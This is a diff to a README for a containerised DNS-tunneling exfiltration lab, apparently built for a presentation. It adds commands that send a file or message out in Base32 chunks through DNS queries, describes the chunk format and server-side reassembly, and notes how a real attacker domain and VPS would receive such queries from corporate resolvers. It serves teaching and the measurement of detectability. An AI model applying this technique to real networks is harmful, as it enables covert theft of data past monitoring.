@@ -4,7 +4,7 @@
 
 ```
 [Client 10.10.0.100]
-   │  DNS queries: <b32_chunk>.<seq>.<session>.tunnel.lab
+   │  DNS queries: <b32_chunk>.<seq>.<total>.<session>.tunnel.lab
    │
    ▼
 [Unbound resolver 10.10.0.2]          ← stub-zone delegation
@@ -14,7 +14,7 @@
 [Authoritative server 10.10.0.10]     ← attacker-controlled
    │  Reconstructs payload from chunks
    ▼
-  [logs/server_events.jsonl]
+  [logs/server_events.jsonl] & [logs/received.txt]
 ```
 
 ## Quick start
@@ -31,17 +31,24 @@ Or step by step:
 ```bash
 docker compose up -d --build
 
-# Exfiltrate a custom message
+# 1. Exfiltrate a text file (using the mounted ./data directory)
+docker exec -it dns_client python client.py --file /data/input.txt
+
+# Or exfiltrate a custom inline message
 docker exec -it dns_client python client.py --send "top secret data"
 
-# Run all measurements
+# 2. Check the raw query events logged by the authoritative server
+docker exec dns_authoritative tail -n 20 /logs/server_events.jsonl
+
+# 3. Check the reassembled and decoded text file on the authoritative server
+# (Also directly accessible on host at ./logs/received.txt)
+docker exec dns_authoritative cat /logs/received.txt
+
+# 4. Run all measurements (bandwidth + robustness)
 docker exec -it dns_client python client.py --measure
 
-# Detectability analysis only (no network needed)
+# 5. Detectability analysis only (no network needed)
 docker exec -it dns_client python metrics.py
-
-# Check what the server received
-docker exec dns_authoritative cat /logs/server_events.jsonl
 ```
 
 ## Realistic DNS configuration (Slide 9 note)
@@ -55,15 +62,26 @@ ns1.attacker.com.  A   <VPS public IP>
 Every corporate resolver then naturally forwards `*.attacker.com` queries
 to the attacker's VPS. The lab mirrors this logic exactly.
 
-## Encoding scheme (Slide 7 connection)
+## Encoding & Transmission scheme (Slide 7 connection)
 
 ```
 Payload (bytes)  →  Base32  →  30-char chunks  →  DNS labels
-"secret"         →  "ON2XEZI=" →  ["on2xezi"]  →  on2xezi.0.s1.tunnel.lab
+"secret"         →  "ON2XEZI=" →  ["on2xezi"]  →  on2xezi.0.1.s1.tunnel.lab
 ```
 
-Base32 uses only `[a-z2-7]`, which is a valid DNS label charset.
-Max label length: 63 chars → 63 chars × 5 bits/char = ~315 bits ≈ 39 bytes/query.
+* **Query format**: `<b32_chunk>.<seq>.<total>.<session>.tunnel.lab`
+  * `<b32_chunk>`: Base32-encoded slice of the file/payload (up to 30 characters).
+  * `<seq>`: Zero-based sequence number of the chunk.
+  * `<total>`: Total number of chunks in this transmission.
+  * `<session>`: Session identifier (default: `s1`).
+* **Base32 charset**: uses only `[a-z2-7]`, which is a valid DNS label charset.
+* **Max label length**: 63 chars → 63 chars × 5 bits/char = ~315 bits ≈ 39 bytes/query.
+* **Reassembly**: As each query arrives, the authoritative server logs the chunk into `/logs/server_events.jsonl` and responds with `A 1.0.0.1` (ACK). Once all `<total>` chunks have arrived, the server automatically sorts them, decodes the Base32 payload, and saves the original text to `/logs/received.txt`.
+
+## Volumes & File Access
+
+* **Input (`./data:/data`)**: Place any text file in `./data/` on the host, and reference it from the client container as `/data/<filename>` (e.g. `/data/input.txt`).
+* **Output (`./logs:/logs`)**: The authoritative server writes `/logs/server_events.jsonl` and `/logs/received.txt`. Both are immediately available on the host inside the `./logs/` folder.
 
 ## Expected measurements for slides 10–11
 
